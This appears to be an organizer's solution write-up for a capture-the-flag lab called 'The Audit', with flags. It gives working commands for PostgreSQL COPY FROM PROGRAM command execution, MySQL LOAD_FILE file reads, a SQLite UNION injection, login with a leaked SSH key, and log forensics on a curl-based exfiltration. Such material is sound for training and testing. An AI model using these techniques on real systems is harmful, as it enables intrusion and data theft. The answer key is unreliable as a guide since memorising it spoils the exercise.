# The Audit — full solution (ORGANIZER)

Four live exploits and one forensic reconstruction. The reference solver is
[../scripts/solver/solve.py](../scripts/solver/solve.py); `make check` runs it
in-network and submits every flag to the scoreboard. Host-side one-liners below.

---

## 1 — The Query Plan (PostgreSQL COPY FROM PROGRAM)
Superuser `postgres`/`postgres`; `COPY ... FROM PROGRAM` runs shell as the
postgres OS user.

```bash
PGPASSWORD=postgres psql -h localhost -p 55432 -U postgres \
  -c "CREATE TABLE pwn(d text); COPY pwn FROM PROGRAM 'cat /flag'; SELECT * FROM pwn;"
```
Flag `AUD{p0stgr3s_c0py_fr0m_pr0gr4m_sup3rus3r_rc3}`.

## 2 — The Dump (MySQL LOAD_FILE)
`appuser` has `FILE` and `secure_file_priv` is empty.

```bash
mysql -h 127.0.0.1 -P 33306 -u appuser -pappuser -N -e "SELECT LOAD_FILE('/flag')"
```
Flag `AUD{mysql_f1l3_pr1v_l04d_f1l3_s3cur3_f1l3_pr1v}`.

## 3 — The Catalog (SQLite UNION injection)
`/api/product?id=` is concatenated into the query. Dump `sqlite_master` to find
`ops_secret_vault`, then UNION it out:

```bash
curl "http://localhost:8096/api/product?id=0 UNION SELECT id,k,v FROM ops_secret_vault--"
```
Flag `AUD{sql1t3_un10n_1nj3ct10n_sql1t3_m4st3r_dump}`.

## 4 — The Backdoor Key (leaked SSH key)
The app's backup dir is exposed; the key authenticates `dbadmin`.

```bash
curl -s http://localhost:8096/backup/id_ed25519 -o k && chmod 600 k
ssh -i k -o StrictHostKeyChecking=no -p 2222 dbadmin@localhost cat /flag
```
Flag `AUD{ssh_l34k3d_pr1v4t3_k3y_dbadm1n_f00th0ld}`.

## 5 — The Audit Trail (log forensics)
1. `GET /audit/auth.log` → the single `Accepted publickey for dbadmin from
   203.0.113.37` at `02:16:58` is the breach (the rest are brute-force noise).
2. `GET /audit/pg_audit.log` → the session whose `start` is seconds later
   (`sess=e9d1`, `02:17:02`) exfiltrates via
   `COPY (SELECT 1) TO PROGRAM 'curl ...?c=<base64>'`. The `sess=bk01` 03:00
   "nightly backup" is a decoy.
3. Concatenate `e9d1`'s `c=` chunks in order and base64-decode:

```bash
curl -s http://localhost:8505/audit/pg_audit.log \
 | grep 'sess=e9d1' | grep -o 'c=[A-Za-z0-9+/=]*' | cut -d= -f2 | tr -d '\n' | base64 -d
```
Flag `AUD{ssh_brut3f0rc3_db_3xf1l_4ud1t_l0g_f0r3ns1cs}`.

---

## One-shot

```bash
make up && make check     # -> ALL 5 FLAGS CAPTURED, exit 0
```
